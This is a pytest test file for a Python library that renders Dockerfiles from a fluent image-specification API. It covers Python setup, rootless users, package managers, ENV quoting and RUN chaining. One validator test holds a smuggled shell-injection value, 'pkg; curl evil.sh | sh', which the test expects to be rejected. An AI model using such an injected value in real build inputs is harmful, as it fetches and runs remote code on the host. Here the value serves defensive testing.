from __future__ import annotations

from pathlib import Path

import pytest

from containerspec import ImageSpec


class TestDockerfile:
    def test_rootless_apt_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("nvidia/cuda:13.3.0-devel-ubuntu24.04", pin_digest=False)
            .add_python("3.12")
            .apt_install("git", "build-essential")
            .uv_pip_install("vllm", "flashinfer==0.2.0")
            .pip_install("huggingface_hub[hf_transfer]")
            .env({"HF_HOME": "/home/warden/.cache/huggingface", "HF_HUB_ENABLE_HF_TRANSFER": "1"})
            .workdir("/app")
            .user(uid=1000, gid=1000, name="warden")
            .chown("/home/warden/.cache/huggingface")
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "rootless_apt_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_rootless_apk_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("alpine:3.20", pin_digest=False)
            .apk_install("openrc", "util-linux")
            .run_commands("ln -s agetty /etc/init.d/agetty.ttyS0")
            .env({"TERM": "linux"})
            .user(uid=1000, gid=1000, name="warden")
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "rootless_apk_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_root_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("nvidia/cuda:13.3.0-devel-ubuntu24.04", pin_digest=False)
            .add_python("3.12")
            .uv_pip_install("vllm")
            .env({"HF_HOME": "/root/.cache/huggingface"})
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "root_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_add_python_lines(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).add_python("3.12")
        df = spec.to_dockerfile()
        assert "COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/" in df
        assert "uv python install 3.12" in df
        assert "uv venv --python 3.12 /opt/venv" in df
        assert "ENV PATH=/opt/venv/bin:$PATH" in df

    def test_no_python_when_not_added(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).uv_pip_install("vllm")
        df = spec.to_dockerfile()
        assert "uv venv" not in df
        assert "PATH=/opt/venv" not in df

    def test_workdir(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).workdir("/app")
        df = spec.to_dockerfile()
        assert "WORKDIR /app" in df

    def test_entrypoint_clear(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).entrypoint([])
        df = spec.to_dockerfile()
        assert "ENTRYPOINT []" in df

    def test_entrypoint_none_omits(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).entrypoint(None)
        df = spec.to_dockerfile()
        assert "ENTRYPOINT" not in df

    def test_expose(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).expose(8000, 8080)
        df = spec.to_dockerfile()
        assert "EXPOSE 8000 8080" in df

    def test_cmd(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).cmd(["vllm", "serve", "model"])
        df = spec.to_dockerfile()
        assert 'CMD ["vllm", "serve", "model"]' in df

    def test_volume(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).volume("/data")
        df = spec.to_dockerfile()
        assert 'VOLUME ["/data"]' in df

    def test_copy(self, tmp_path) -> None:
        src = tmp_path / "init.sh"
        src.write_text("#!/bin/bash\necho hello")
        spec = ImageSpec.from_registry("base", pin_digest=False).copy(str(src), "/app/init.sh")
        df = spec.to_dockerfile()
        assert f"COPY {src} /app/init.sh" in df

    def test_copy_from_stage(self) -> None:
        builder = ImageSpec.from_registry("node:22", pin_digest=False).workdir("/app")
        stage = builder.with_stage("builder")
        runtime = (
            ImageSpec.from_registry("nginx:alpine", pin_digest=False)
            .copy_from_stage(stage, "/app/dist", "/usr/share/nginx/html")
            .expose(80)
        )
        df = runtime.to_dockerfile()
        assert "COPY --from=builder /app/dist /usr/share/nginx/html" in df
        assert "FROM node:22 AS builder" in df
        assert "FROM nginx:alpine" in df

    def test_cmd_none_renders_comment_only(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).cmd(None)
        df = spec.to_dockerfile()
        assert "# cmd(None)" in df
        assert "CMD " not in df

    def test_chown_explicit_uid_gid(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data", uid=1000, gid=1000)
        df = spec.to_dockerfile()
        assert "chown -R 1000:1000 /data" in df

    def test_chown_only_uid_raises(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data", uid=1000)
        with pytest.raises(ValueError, match="uid and gid must both be specified"):
            spec.to_dockerfile()

    def test_chown_no_user_layer_raises(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data")
        with pytest.raises(ValueError, match=r"no preceding \.user\(\) layer"):
            spec.to_dockerfile()

    def test_brew_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq")
        df = spec.to_dockerfile()
        assert "brew install jq" in df

    def test_nvm_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("20")
        df = spec.to_dockerfile()
        assert "nvm install 20" in df
        assert "nvm-sh/nvm" in df

    def test_npm_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).npm_install("typescript")
        df = spec.to_dockerfile()
        assert "npm install -g typescript" in df

    def test_dnf_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).dnf_install("git", "curl")
        df = spec.to_dockerfile()
        assert "dnf install -y curl git" in df
        assert "--mount=type=cache,target=/var/cache/dnf" in df

    def test_env_value_with_spaces_quoted(self) -> None:
        """ENV values containing spaces are quoted to prevent corruption."""
        spec = ImageSpec.from_registry("base", pin_digest=False).env(
            {"FOO": "hello world", "BAR": "simple"}
        )
        df = spec.to_dockerfile()
        assert 'ENV FOO="hello world"' in df
        assert "ENV BAR=simple" in df

    def test_env_value_with_quote_escaped(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).env({"FOO": 'say "hi"'})
        df = spec.to_dockerfile()
        assert 'ENV FOO="say \\"hi\\""' in df

    def test_apt_install_has_debian_frontend_noninteractive(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).apt_install("git")
        df = spec.to_dockerfile()
        assert "DEBIAN_FRONTEND=noninteractive" in df

    def test_run_commands_chained_single_run(self) -> None:
        """Multiple run_commands produce a single RUN with && chaining."""
        spec = ImageSpec.from_registry("base", pin_digest=False).run_commands(
            "echo a", "echo b", "echo c"
        )
        df = spec.to_dockerfile()
        assert "RUN echo a && echo b && echo c" in df
        run_lines = [line for line in df.split("\n") if line.startswith("RUN ")]
        assert len(run_lines) == 1

    def test_invalid_package_name_raises(self) -> None:
        """Package names with shell metacharacters are rejected at render time."""
        from containerspec.renderers import validate_package

        with pytest.raises(ValueError, match="Invalid package name"):
            validate_package("pkg; curl evil.sh | sh")

    def test_valid_package_with_extras(self) -> None:
        """Package names with extras like huggingface_hub[hf_transfer] are valid."""
        from containerspec.renderers import validate_package

        assert validate_package("huggingface_hub[hf_transfer]") == "huggingface_hub[hf_transfer]"

    def test_nvm_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("22")
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df

    def test_rust_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).rust_install()
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df

    def test_brew_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq")
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df
